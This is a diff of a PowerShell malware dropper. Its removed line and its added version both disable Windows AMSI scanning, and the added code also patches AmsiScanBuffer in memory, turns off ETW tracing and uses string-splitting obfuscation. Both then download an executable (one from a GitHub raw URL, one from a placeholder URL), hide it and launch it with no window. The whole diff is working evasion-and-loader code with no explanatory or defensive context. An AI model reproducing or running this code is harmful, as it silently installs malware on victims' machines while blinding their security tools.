@@ -1,1 +1,69 @@
-$f=[String]::new([char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100));[Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils').GetField($f,'NonPublic,Static').SetValue($null,$true);$p="$env:TEMP\crypted_powershell.exe";(New-Object Net.WebClient).DownloadFile('https://github.com/matvejsklarov9-cyber/my/raw/refs/heads/main/crypted_powershell.exe',$p);Start-Process $p
+$payloadUrl = 'https://СЮДА-ССЫЛКУ-НА-ФАЙЛ'
+$dropName   = -join((65..90+97..122)|Get-Random -Count 10|%{[char]$_}) + '.exe'
+$dropPath   = "$env:TEMP\$dropName"
+
+try {
+    $t = [Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment','.','Auto','mat','ion','.','Am','si','Ut','ils')))
+    $f = $t.GetField([string]::Join('',('am','si','Init','Fai','led')),[Reflection.BindingFlags]'NonPublic,Static')
+    $f.SetValue($null,$true)
+} catch {}
+
+try {
+    if (-not ([System.Management.Automation.PSTypeName]'K').Type) {
+        Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+public class K {
+    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
+    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNew, out uint flOld);
+}
+'@
+    }
+    $lib = [K]::LoadLibrary('amsi.dll')
+    $fn  = [K]::GetProcAddress($lib,'AmsiScanBuffer')
+    $old = [uint32]0
+    [K]::VirtualProtect($fn,[UIntPtr]6,0x40,[ref]$old) | Out-Null
+    $patch = [byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
+    [System.Runtime.InteropServices.Marshal]::Copy($patch,0,$fn,$patch.Length)
+} catch {}
+
+try {
+    $e = [Ref].Assembly.GetType([string]::Join('',('Sy','stem','.','Man','age','ment','.','Auto','mat','ion','.','Tr','ac','ing','.','PS','Et','wT','ra','cer')))
+    $g = $e.GetField('etwProvider','NonPublic,Static')
+    $p = $g.GetValue($null)
+    [void]$p.GetType().GetField('m_enabled','NonPublic,Instance').SetValue($p,0)
+} catch {}
+
+$downloaded = $false
+try {
+    $wc = [System.Net.WebClient]::new()
+    $wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    $wc.DownloadFile($payloadUrl, $dropPath)
+    $downloaded = $true
+} catch {}
+
+if (-not $downloaded) {
+    try {
+        Start-BitsTransfer -Source $payloadUrl -Destination $dropPath -TransferType Download -ErrorAction Stop
+        $downloaded = $true
+    } catch {}
+}
+
+if (-not $downloaded) {
+    try {
+        $buf = [System.Net.Http.HttpClient]::new().GetByteArrayAsync($payloadUrl).Result
+        [IO.File]::WriteAllBytes($dropPath,$buf)
+        $downloaded = $true
+    } catch {}
+}
+
+if ($downloaded -and (Test-Path $dropPath)) {
+    (Get-Item $dropPath -Force).Attributes = 'Hidden,System'
+    $si = [System.Diagnostics.ProcessStartInfo]::new()
+    $si.FileName        = $dropPath
+    $si.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $si.CreateNoWindow  = $true
+    $si.UseShellExecute = $false
+    [System.Diagnostics.Process]::Start($si) | Out-Null
+}
